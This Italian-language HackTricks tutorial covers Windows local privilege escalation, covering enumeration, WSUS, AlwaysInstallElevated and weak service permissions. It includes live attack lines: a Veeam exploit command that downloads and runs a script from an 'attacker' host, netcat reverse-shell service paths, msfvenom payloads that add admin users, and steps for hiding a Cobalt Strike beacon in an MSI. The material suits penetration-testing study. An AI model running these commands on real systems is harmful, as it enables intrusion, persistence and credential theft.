# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Miglior strumento per cercare vettori di Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoria iniziale su Windows

### Access Tokens

**Se non sai cosa sono i Windows Access Tokens, leggi la pagina seguente prima di continuare:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consulta la pagina seguente per maggiori informazioni su ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Se non sai cosa sono gli integrity levels in Windows, dovresti leggere la pagina seguente prima di continuare:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Controlli di sicurezza di Windows

Su Windows esistono diverse componenti che potrebbero **impedirti di enumerare il sistema**, eseguire eseguibili o persino **rilevare le tue attività**. Dovresti **leggere** la seguente **pagina** ed **enumerare** tutti questi **meccanismi di difesa** prima di iniziare l'enumerazione per privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Informazioni di sistema

### Enumerazione delle informazioni di versione

Verifica se la versione di Windows ha vulnerabilità note (controlla anche le patch installate).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploit per versione

Questo [site](https://msrc.microsoft.com/update-guide/vulnerability) è utile per cercare informazioni dettagliate sulle vulnerabilità di sicurezza di Microsoft. Questo database contiene più di 4.700 vulnerabilità di sicurezza, mostrando la **massive attack surface** che un ambiente Windows presenta.

**Sul sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ha watson incorporato)_

**Localmente con informazioni di sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos di exploit:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ambiente

Qualche credenziale o informazione interessante salvata nelle variabili d'ambiente?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Cronologia di PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### File di PowerShell Transcript

Puoi imparare come attivarlo in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

I dettagli delle esecuzioni della pipeline di PowerShell vengono registrati, includendo i comandi eseguiti, le invocazioni dei comandi e parti di script. Tuttavia, i dettagli completi dell'esecuzione e i risultati di output potrebbero non essere catturati.

Per abilitarlo, segui le istruzioni nella sezione "Transcript files" della documentazione, scegliendo **"Module Logging"** invece di **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Per visualizzare gli ultimi 15 eventi dai log di PowersShell puoi eseguire:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Viene catturato un record completo delle attività e del contenuto dell'esecuzione dello script, garantendo che ogni blocco di codice sia documentato durante l'esecuzione. Questo processo preserva una traccia di audit completa di ciascuna attività, utile per le analisi forensi e per l'analisi di comportamenti dannosi. Documentando tutte le attività al momento dell'esecuzione, vengono fornite informazioni dettagliate sul processo.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Gli eventi di logging per lo Script Block possono essere trovati nel Windows Event Viewer al percorso: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Per visualizzare gli ultimi 20 eventi puoi usare:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Impostazioni Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unità
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Puoi compromettere il sistema se gli aggiornamenti non vengono richiesti usando http**S** ma http.

Inizi controllando se la rete usa un aggiornamento WSUS non-SSL eseguendo quanto segue in cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oppure il seguente in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Se ricevi una risposta come una di queste:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` o `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` è uguale a `1`.

Allora, **è sfruttabile.** Se l'ultima chiave di registro è uguale a `0`, la voce WSUS verrà ignorata.

Per sfruttare questa vulnerabilità puoi usare strumenti come: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - si tratta di script exploit MiTM per iniettare aggiornamenti 'fake' nel traffico WSUS non-SSL.

Leggi la ricerca qui:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Fondamentalmente, questo è il difetto che sfrutta questo bug:

> Se abbiamo la possibilità di modificare il proxy del nostro utente locale, e Windows Updates usa il proxy configurato nelle impostazioni di Internet Explorer, allora abbiamo la possibilità di eseguire [PyWSUS](https://github.com/GoSecure/pywsus) localmente per intercettare il nostro traffico ed eseguire codice come utente elevato sul nostro asset.
>
> Inoltre, poiché il servizio WSUS utilizza le impostazioni dell'utente corrente, userà anche il relativo store di certificati. Se generiamo un certificato self-signed per l'hostname WSUS e aggiungiamo questo certificato nello store di certificati dell'utente corrente, saremo in grado di intercettare sia il traffico WSUS HTTP che HTTPS. WSUS non utilizza meccanismi simili a HSTS per implementare una validazione di tipo trust-on-first-use sul certificato. Se il certificato presentato è trusted dall'utente e ha il corretto hostname, sarà accettato dal servizio.

Puoi sfruttare questa vulnerabilità usando lo strumento [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una volta reso disponibile).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Molti agent enterprise espongono una superficie IPC su localhost e un canale di aggiornamento privilegiato. Se l'enrollment può essere forzato verso un server controllato dall'attaccante e l'updater si fida di una rogue root CA o di controlli di firma deboli, un utente locale può consegnare un MSI maligno che il servizio SYSTEM installa. Vedi una tecnica generalizzata (basata sulla catena Netskope stAgentSvc – CVE-2025-0309) qui:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` espone un servizio su localhost su **TCP/9401** che elabora messaggi controllati dall'attaccante, consentendo comandi arbitrari come **NT AUTHORITY\SYSTEM**.

- **Recon**: conferma il listener e la versione, es., `netstat -ano | findstr 9401` e `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: posiziona un PoC come `VeeamHax.exe` con le DLL Veeam richieste nella stessa directory, poi innesca un payload SYSTEM tramite la socket locale:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Il servizio esegue il comando come SYSTEM.
## KrbRelayUp

Esiste una vulnerabilità di **local privilege escalation** in ambienti **Windows domain** in condizioni specifiche. Queste condizioni includono ambienti in cui **LDAP signing non è applicato,** utenti che possiedono self-rights che permettono loro di configurare **Resource-Based Constrained Delegation (RBCD),** e la possibilità per gli utenti di creare computer all'interno del dominio. È importante notare che questi **requisiti** vengono soddisfatti con le **impostazioni predefinite**.

Trova l'**exploit** in [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Per maggiori informazioni sul flusso dell'attacco consulta [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** questi 2 registri sono **abilitati** (valore **0x1**), allora utenti di qualsiasi privilegio possono **installare** (eseguire) `*.msi` come NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se hai una sessione meterpreter puoi automatizzare questa tecnica usando il modulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa il comando `Write-UserAddMSI` di power-up per creare nella directory corrente un Windows MSI binary to escalate privileges. Questo script scrive un MSI installer precompilato che richiede l'aggiunta di un utente/gruppo (quindi avrai bisogno di GIU access):
```
Write-UserAddMSI
```
Esegui semplicemente il binary creato per elevare i privilegi.

### MSI Wrapper

Leggi questo tutorial per imparare come creare un MSI wrapper usando questi strumenti. Nota che puoi wrapparе un "**.bat**" file se vuoi **solo** **eseguire** **comandi da riga di comando**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Genera** con Cobalt Strike o Metasploit un **nuovo Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Apri **Visual Studio**, seleziona **Create a new project** e digita "installer" nella casella di ricerca. Seleziona il progetto **Setup Wizard** e clicca **Next**.
- Dai al progetto un nome, come **AlwaysPrivesc**, usa **`C:\privesc`** per la posizione, seleziona **place solution and project in the same directory**, e clicca **Create**.
- Continua a cliccare **Next** fino ad arrivare al passo 3 di 4 (choose files to include). Clicca **Add** e seleziona il Beacon payload che hai appena generato. Poi clicca **Finish**.
- Seleziona il progetto **AlwaysPrivesc** in **Solution Explorer** e nelle **Properties**, cambia **TargetPlatform** da **x86** a **x64**.
- Ci sono altre proprietà che puoi modificare, come **Author** e **Manufacturer**, che possono far sembrare l'app installata più legittima.
- Clicca col tasto destro sul progetto e seleziona **View > Custom Actions**.
- Clicca col tasto destro su **Install** e seleziona **Add Custom Action**.
- Fai doppio clic su **Application Folder**, seleziona il tuo file **beacon.exe** e clicca **OK**. Questo garantirà che il payload beacon venga eseguito non appena l'installer viene avviato.
- Sotto le **Custom Action Properties**, cambia **Run64Bit** in **True**.
- Infine, **build it**.
- Se viene mostrato l'avviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, assicurati di impostare la piattaforma su x64.

### MSI Installation

Per eseguire l'**installazione** del file `.msi` malevolo in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Per sfruttare questa vulnerabilità puoi usare: _exploit/windows/local/always_install_elevated_

## Antivirus e Rilevatori

### Impostazioni di audit

Queste impostazioni determinano ciò che viene **registrato**, quindi dovresti prestare attenzione
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, è utile sapere dove vengono inviati i log
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** è pensato per la **gestione delle local Administrator passwords**, assicurando che ogni password sia **unica, randomizzata e aggiornata regolarmente** sui computers joined to a domain. Queste password sono memorizzate in modo sicuro all'interno di Active Directory e possono essere consultate solo dagli utenti a cui sono stati concessi permessi sufficienti tramite ACLs, permettendo loro di visualizzare le local admin passwords se autorizzati.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Se attivo, **le plain-text passwords sono memorizzate in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

A partire da **Windows 8.1**, Microsoft ha introdotto una protezione potenziata per la Local Security Authority (LSA) per **bloccare** i tentativi da parte di processi non attendibili di **leggere la sua memoria** o di iniettare codice, migliorando ulteriormente la sicurezza del sistema.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** è stato introdotto in **Windows 10**. Il suo scopo è proteggere le credenziali memorizzate su un dispositivo da minacce come pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

Le **Domain credentials** vengono autenticate dalla **Local Security Authority** (LSA) e utilizzate dai componenti del sistema operativo. Quando i dati di logon di un utente vengono autenticati da un security package registrato, le **Domain credentials** per l'utente vengono tipicamente stabilite.\  
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Utenti & Gruppi

### Enumerare Utenti & Gruppi

Dovresti verificare se uno dei gruppi a cui appartieni ha permessi interessanti
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Gruppi privilegiati

Se **appartieni a un gruppo privilegiato potresti essere in grado di ottenere privilegi elevati**. Scopri i gruppi privilegiati e come abusarne per ottenere privilegi qui:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipolazione dei token

**Scopri di più** su cos'è un **token** in questa pagina: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulta la pagina seguente per **scoprire i token interessanti** e come abusarne:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Utenti connessi / Sessioni
```bash
qwinsta
klist sessions
```
### Cartelle home
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politica delle password
```bash
net accounts
```
### Ottieni il contenuto degli appunti
```bash
powershell -command "Get-Clipboard"
```
## Processi in esecuzione

### Permessi di file e cartelle

Per prima cosa, elencando i processi **controlla la presenza di password nella command line del processo**.\
Verifica se puoi **sovrascrivere qualche binary in esecuzione** o se hai permessi di scrittura sulla cartella dei binary per sfruttare possibili [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Verifica sempre la presenza di eventuali [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Controllo dei permessi dei binari dei processi**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Controllo dei permessi delle cartelle dei binari dei processi (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Puoi creare un memory dump di un processo in esecuzione usando **procdump** di sysinternals. Servizi come FTP possono avere le **credentials in clear text in memory**; prova a effettuare il dump della memoria e leggere le credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Applicazioni GUI insicure

**Le applicazioni in esecuzione come SYSTEM possono permettere a un utente di avviare un CMD o di esplorare directory.**

Esempio: "Windows Help and Support" (Windows + F1), cerca "command prompt", clicca su "Click to open Command Prompt"

## Servizi

Service Triggers consentono a Windows di avviare un servizio quando si verificano determinate condizioni (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Anche senza i diritti SERVICE_START spesso puoi avviare servizi privilegiati attivando i loro trigger. Vedi tecniche di enumerazione e attivazione qui:

-
{{#ref}}
service-triggers.md
{{#endref}}

Ottieni l'elenco dei servizi:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permessi

Puoi usare **sc** per ottenere informazioni su un servizio
```bash
sc qc <service_name>
```
Si consiglia di avere il binary **accesschk** da _Sysinternals_ per verificare il livello di privilegi richiesto per ogni servizio.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
È consigliabile verificare se "Authenticated Users" può modificare qualsiasi servizio:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Puoi scaricare accesschk.exe per XP qui](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Abilita servizio

Se riscontri questo errore (ad esempio con SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Puoi abilitarlo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Tieni presente che il servizio upnphost dipende da SSDPSRV per funzionare (per XP SP1)**

**Un'altra soluzione a questo problema è eseguire:**
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

Nel caso in cui il gruppo "Authenticated users" possieda **SERVICE_ALL_ACCESS** su un servizio, è possibile modificare il binario eseguibile del servizio. Per modificare ed eseguire **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Riavviare il servizio
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
I privilegi possono essere elevati tramite varie autorizzazioni:

- **SERVICE_CHANGE_CONFIG**: Permette la riconfigurazione dell'eseguibile del servizio.
- **WRITE_DAC**: Abilita la riconfigurazione dei permessi, consentendo di modificare le configurazioni dei servizi.
- **WRITE_OWNER**: Permette l'acquisizione della proprietà e la riconfigurazione dei permessi.
- **GENERIC_WRITE**: Ereditа la capacità di modificare le configurazioni dei servizi.
- **GENERIC_ALL**: Ereditа anch'essa la capacità di modificare le configurazioni dei servizi.

Per il rilevamento e lo sfruttamento di questa vulnerabilità, può essere utilizzato _exploit/windows/local/service_permissions_.

### Servizi: permessi deboli sugli eseguibili

**Verifica se puoi modificare l'eseguibile avviato da un servizio** o se hai **permessi di scrittura sulla cartella** in cui si trova l'eseguibile ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puoi ottenere ogni eseguibile avviato da un servizio usando **wmic** (non in system32) e verificare i tuoi permessi usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Puoi anche usare **sc** e **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permessi di modifica del registro dei servizi

Dovresti verificare se puoi modificare qualsiasi registro dei servizi.\
Puoi **verificare** i tuoi **permessi** su un **registro** dei servizi eseguendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Verificare se **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** possiedono i permessi `FullControl`. Se sì, il binario eseguito dal servizio può essere modificato.

Per modificare il percorso del binario eseguito:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Permessi AppendData/AddSubdirectory nel registro dei servizi

Se hai questo permesso su un registro significa che **puoi creare sotto-registri a partire da questo**. Nel caso dei servizi Windows questo è **sufficiente per eseguire codice arbitrario:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Percorsi di servizio non racchiusi tra virgolette

Se il percorso di un eseguibile non è racchiuso tra virgolette, Windows tenterà di eseguire ogni segmento che termina prima di uno spazio.

Ad esempio, per il percorso _C:\Program Files\Some Folder\Service.exe_ Windows proverà a eseguire:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Elenca tutti i percorsi dei service non racchiusi tra virgolette, escludendo quelli appartenenti ai servizi integrati di Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Puoi rilevare e utilizzare l'exploit** per questa vulnerabilità con metasploit: `exploit/windows/local/trusted\_service\_path` Puoi creare manualmente un service binary con metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Azioni di ripristino

Windows consente agli utenti di specificare azioni da eseguire se un servizio fallisce. Questa funzionalità può essere configurata per puntare a un binary. Se questo binary può essere sostituito, potrebbe essere possibile ottenere una privilege escalation. Ulteriori dettagli sono disponibili nella [documentazione ufficiale](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applicazioni

### Applicazioni installate

Verifica i **permessi dei binaries** (forse puoi sovrascriverne uno e ottenere una privilege escalation) e delle **cartelle** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permessi di Scrittura

Verifica se puoi modificare qualche file di configurazione per leggere qualche file speciale oppure se puoi modificare qualche binario che verrà eseguito da un account Administrator (schedtasks).

Un modo per trovare permessi deboli su cartelle/file nel sistema è eseguire:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Esecuzione all'avvio

**Verifica se puoi sovrascrivere qualche registry o binary che verrà eseguito da un altro utente.**\
**Leggi** la **pagina seguente** per saperne di più su interessanti **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Cerca possibili **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Se un driver espone un arbitrary kernel read/write primitive (comune in IOCTL handler mal progettati), puoi ottenere l'escalation dei privilegi rubando un SYSTEM token direttamente dalla kernel memory. Vedi la tecnica step‑by‑step qui:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Per bug di race-condition in cui la chiamata vulnerabile apre un percorso di Object Manager controllato dall'attaccante, rallentare deliberatamente la lookup (usando componenti di lunghezza massima o catene di directory profonde) può estendere la finestra da microsecondi a decine di microsecondi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
